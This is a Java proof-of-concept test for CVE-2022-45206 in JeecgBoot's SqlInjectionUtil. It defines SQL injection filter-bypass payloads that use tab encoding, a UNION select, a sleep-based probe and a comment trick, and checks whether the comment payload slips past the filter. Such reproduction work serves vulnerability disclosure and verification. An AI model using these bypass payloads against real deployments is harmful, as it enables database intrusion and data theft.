import org.jeecg.common.util.SqlInjectionUtil;

/**
 * PoC for CVE-2022-45206 (JeecgBoot <= 3.4.3).
 * 
 * Tests all vulnerable methods in SqlInjectionUtil that were fixed in commit f18ced5:
 * 1. filterContent(String value, String customXssString) 
 * 2. filterContent(String[] values, String customXssString)
 * 3. specialFilterContentForDictSql(String value)
 * 4. specialFilterContentForOnlineReport(String value)
 */

public class JeecgBootSQLiPoCTest {

    // Test payloads with TAB characters (%09)
    private static final String BYPASS_PAYLOAD = "select%09*%09from%09users";  // SQL SELECT statement with TAB characters as %09
    private static final String BYPASS_PAYLOAD_AND = "1%09and%09sleep(5)";  // SQL AND statement with TAB characters as %09
    private static final String BYPASS_PAYLOAD_UNION = "1%09union%09select%09version()";  // SQL UNION statement with TAB characters as %09
    
    // Control payloads that should be blocked
    private static final String BLOCKED_PAYLOAD = "select * from users";  // SQL SELECT statement with normal space
    private static final String BLOCKED_PAYLOAD_AND = "1 and sleep(5)";  // SQL AND statement with normal space
    // Payload that relies on SQL comment. Before fix the util stripped comments, so this payload bypassed checks.
    private static final String COMMENT_BYPASS_PAYLOAD = "/*select*/ 1";

    public static void main(String[] args) {
        System.out.println("======== CVE-2022-45206 (CWE-089) PoC Tests in JeecgBoot 3.4.3 ========\n");
        
        // Only test the comment-based bypass that was fixed in commit f18ced5
        System.out.println("Testing comment-based bypass (payload should be ALLOWED in vulnerable version):\n");
        boolean reproduced = testCommentBypass();

        System.out.println("\n====================================================\n");
        if (reproduced) {
            System.out.println("RESULT: Vulnerability reproduced - the comment bypass was accepted.\n");
        } else {
            System.out.println("RESULT: Vulnerability NOT reproduced - payload was blocked.\n");
        }
    }
    
    // Test methods
    private static boolean testCommentBypass() {
        try {
            SqlInjectionUtil.filterContent(COMMENT_BYPASS_PAYLOAD, null);
            System.out.println("  [VULN] Comment based bypass accepted: '" + COMMENT_BYPASS_PAYLOAD + "'");
            return true;
        } catch (RuntimeException e) {
            System.out.println("  [SAFE] Comment based bypass blocked: '" + COMMENT_BYPASS_PAYLOAD + "'");
            System.out.println("         Exception: " + e.getMessage());
            return false;
        }
    }
}
